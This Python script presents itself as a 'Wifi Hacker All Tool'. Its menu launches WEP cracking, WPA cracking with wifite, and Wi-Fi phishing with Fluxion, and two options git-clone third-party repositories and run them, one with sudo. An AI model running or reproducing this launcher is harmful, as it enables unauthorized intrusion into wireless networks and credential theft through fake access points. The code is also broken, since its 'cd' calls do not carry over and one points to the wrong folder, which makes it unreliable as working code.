import os
import webbrowser
os.system("sudo apt-get install figlet")
os.system("figlet Wifi-Cracker Tool")
print("""

Wifi Hacker All Tool. Coded By arda6

""")
webbrowser.open("https://github.com/arda6")
print("You Accept All Responsibility.")
print("""

1) Wep Hack
2) Wpa Hack
3) Wifi Phishing Hack

""")
secim = str(input("Which :"))
if secim == '1':
    os.system("git clone https://github.com/arda6/Wep-Cracker.git")
    os.system("cd Wep-Cracker")
    os.system("python3 Wep_Cracker.py")
if secim == '2':
    os.system("wifite --wpa")
if secim == '3':
    os.system("git clone https://github.com/FluxionNetwork/fluxion.git")
    os.system("cd FluxionNetwork")
    os.system("sudo bash fluxion.sh -i")
